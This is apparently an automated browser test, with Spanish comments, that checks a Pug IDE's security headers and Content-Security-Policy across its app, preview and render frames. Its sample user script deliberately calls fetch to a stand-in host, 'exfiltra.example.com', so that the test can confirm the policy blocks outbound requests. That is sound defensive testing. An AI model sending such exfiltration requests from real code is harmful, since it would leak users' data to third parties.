import { createHash } from 'node:crypto';
import { check, openApp, previewFrame, previewText, waitUntil } from '../lib.mjs';

// Cabeceras de seguridad (vercel.json, que el servidor de pruebas aplica tal cual) y Content-Security-Policy:
// la app y el preview, con recursos remotos y scripts del usuario, no deben provocar ninguna violación,
// y la política debe bloquear lo que prometemos bloquear (red desde el JavaScript del usuario).
const session = {
  projectName: 'CSP',
  files: {
    '/main.pug': `doctype html
html
  head
    style.
      @font-face { font-family: Remota; src: url(https://fonts.example.com/remota.woff2) format("woff2"); }
      body { font-family: Remota, sans-serif; background: url(https://img.example.com/fondo.png); }
  body
    h1 Titulo CSP
    img#remota(src="https://img.example.com/foto.png" alt="remota")
    img#datos(src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="data")
    p#red sin ejecutar
    script.
      fetch('https://exfiltra.example.com/?x=1').then(function () { document.getElementById('red').textContent = 'red:permitida'; })
        .catch(function () { document.getElementById('red').textContent = 'red:bloqueada'; });
`,
  },
  openTabPaths: ['/main.pug'],
  activeTabPath: '/main.pug',
};

export default async function (env) {
  // Cabeceras tal como las sirve el hosting
  const parse = (csp) => Object.fromEntries(csp.split(';').map((d) => d.trim()).filter(Boolean).map((d) => [d.split(/\s+/)[0], d.split(/\s+/).slice(1)]));
  const hardening = (res) => res.headers.get('x-content-type-options') === 'nosniff' && !!res.headers.get('x-frame-options')
    && !!res.headers.get('referrer-policy') && /camera=\(\)/.test(res.headers.get('permissions-policy') ?? '')
    && /max-age=\d+/.test(res.headers.get('strict-transport-security') ?? '');
  const text = async (path) => (await fetch(env.baseURL + path)).text();
  const inlineScripts = (html) => [...html.matchAll(/<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/g)].map((m) => m[1]).filter((t) => t.trim());

  // Los scripts inline reales de index.html (el que activa las hojas de estilo del CSS crítico) van por hash en la CSP
  const hashes = inlineScripts(await text('/index.html')).map((t) => `'sha256-${createHash('sha256').update(t).digest('base64')}'`);
  check('18 index.html tiene un único script inline (se admite por hash en la CSP)', hashes.length === 1, hashes.join(' '));

  // La app (/ y /ide): script-src sin 'unsafe-inline' ni 'unsafe-eval' (objetivo del plan 11.1)
  for (const path of ['/', '/ide', '/index.html', '/ngsw-worker.js', '/manifest.webmanifest']) {
    const res = await fetch(env.baseURL + path);
    const csp = res.headers.get('content-security-policy') ?? '';
    const d = parse(csp);
    check(`18 ${path}: CSP con object-src none y frame-ancestors none`, d['object-src']?.join() === "'none'" && d['frame-ancestors']?.join() === "'none'", csp);
    check(`18 ${path}: script-src solo 'self' y hashes: ni 'unsafe-inline' ni 'unsafe-eval' ni 'wasm-unsafe-eval' ni https:`,
      d['script-src']?.[0] === "'self'" && d['script-src'].slice(1).every((v) => /^'sha256-[A-Za-z0-9+/=]+'$/.test(v)) && hashes.every((h) => d['script-src'].includes(h)), csp);
    check(`18 ${path}: la CSP permite imágenes y fuentes remotas, workers blob: y no abre la red a terceros`,
      d['img-src']?.includes('https:') && d['font-src']?.includes('https:') && d['worker-src']?.includes('blob:') && d['connect-src']?.join(' ') === "'self' blob: data:", csp);
    check(`18 ${path}: nosniff, DENY, Referrer-Policy, Permissions-Policy y HSTS`, hardening(res) && res.headers.get('x-frame-options') === 'DENY');
  }

  // Documentos propios donde corre el código del usuario: su CSP va por cabecera. El del preview SÍ lleva unsafe-inline y
  // unsafe-eval (es el JavaScript de la plantilla), pero es de origen opaco por la directiva `sandbox` y sin red de terceros.
  const pf = await fetch(env.baseURL + '/assets/preview-frame.html');
  const pfCsp = pf.headers.get('content-security-policy') ?? '';
  const pfd = parse(pfCsp);
  check('18 preview-frame.html: sandbox sin allow-same-origin (origen opaco aunque se abra suelto) y unsafe-inline/eval para el script del usuario',
    pfd['sandbox']?.includes('allow-scripts') && !pfd['sandbox'].includes('allow-same-origin') && pfd['script-src']?.join(' ') === "'unsafe-inline' 'unsafe-eval'" && pfd['script-src']?.includes("'unsafe-inline'") && pfd['script-src'].includes("'unsafe-eval'"), pfCsp);
  check('18 preview-frame.html: sin red de terceros (connect-src blob: data:), imágenes y fuentes remotas permitidas, solo embebible por la app',
    pfd['connect-src']?.join(' ') === 'blob: data:' && pfd['default-src']?.join() === "'none'" && pfd['img-src']?.includes('https:') && pfd['font-src']?.includes('https:')
    && pfd['frame-ancestors']?.join() === "'self'" && pfd['object-src']?.join() === "'none'" && pf.headers.get('x-frame-options') === 'SAMEORIGIN' && hardening(pf), pfCsp);
  const rf = await fetch(env.baseURL + '/assets/render-frame.html');
  const rfCsp = rf.headers.get('content-security-policy') ?? '';
  const rfd = parse(rfCsp);
  const rfHashes = inlineScripts(await text('/assets/render-frame.html')).map((t) => `'sha256-${createHash('sha256').update(t).digest('base64')}'`);
  check('18 render-frame.html: sandbox sin allow-same-origin, unsafe-eval (Pug) sin unsafe-inline, su único script inline por hash, Worker solo blob:, sin red',
    rfd['sandbox']?.join(' ') === 'allow-scripts' && rfHashes.length === 1 && rfd['script-src']?.join(' ') === `${rfHashes[0]} 'unsafe-eval'` && rfd['worker-src']?.join() === 'blob:' && rfd['connect-src']?.join() === "'none'"
    && rfd['frame-ancestors']?.join() === "'self'" && rf.headers.get('x-frame-options') === 'SAMEORIGIN' && hardening(rf), rfCsp);
  const ph = await fetch(env.baseURL + '/assets/preview-host.html');
  const phCsp = ph.headers.get('content-security-policy') ?? '';
  const phd = parse(phCsp);
  check("18 preview-host.html: script-src 'self' sin unsafe-*, sin red, no embebible; su iframe es preview-frame.html",
    phd['script-src']?.join() === "'self'" && phd['connect-src']?.join() === "'none'" && phd['frame-ancestors']?.join() === "'none'" && phd['frame-src']?.join() === "'self'"
    && ph.headers.get('x-frame-options') === 'DENY' && hardening(ph), phCsp);
  check('18 preview-host.html no tiene scripts inline (su código está en preview-host.js)', inlineScripts(await text('/assets/preview-host.html')).length === 0);
  check('18 el service worker conserva su Cache-Control junto a las cabeceras de seguridad',
    (await fetch(env.baseURL + '/ngsw-worker.js')).headers.get('cache-control')?.includes('must-revalidate') === true);
  check('18 el manifest conserva su Content-Type', (await fetch(env.baseURL + '/manifest.webmanifest')).headers.get('content-type') === 'application/manifest+json');

  // El preview y el render corren en documentos propios con su CSP: con recursos remotos y scripts del usuario, 0 violaciones
  // salvo la deliberada de abajo (el fetch a un tercero).
  // Firefox y WebKit no vuelcan las violaciones a la consola con el mismo texto: ahí solo se exige que no haya otras.
  // Nota: el preview reescribe su documento con document.open(), que borra los listeners; las violaciones llegan por el texto de la consola.
  const app = await openApp(env, { path: '/ide', session });
  const { page } = app;
  await waitUntil(async () => (await previewText(page)).includes('Titulo CSP'));
  const frame = await previewFrame(page);
  const red = await waitUntil(async () => frame && (await frame.evaluate(() => document.getElementById('red')?.textContent).catch(() => null)) !== 'sin ejecutar'
    ? frame.evaluate(() => document.getElementById('red').textContent).catch(() => null) : null);
  check('18 el script del usuario corre en el preview, pero la CSP bloquea sus peticiones a terceros', red === 'red:bloqueada', String(red));
  check('18 la única violación es la del fetch deliberado a un tercero (connect-src)',
    ((process.env.PUGIDE_BROWSER || 'chromium') !== 'chromium' || app.violations.some((v) => /connect-src/.test(v))) && app.violations.every((v) => v.includes('exfiltra.example.com')), JSON.stringify(app.violations));
  check('18 el preview con imagen/fuente remota y data: se pinta (el único bloqueo es el de red)', (await previewText(page)).includes('Titulo CSP'));
  check('18 las imágenes remotas se intentan cargar (img-src https:) sin violación', app.external.some((u) => u.includes('img.example.com/foto.png')), JSON.stringify(app.external));
  await app.close({ expectViolations: true });
}
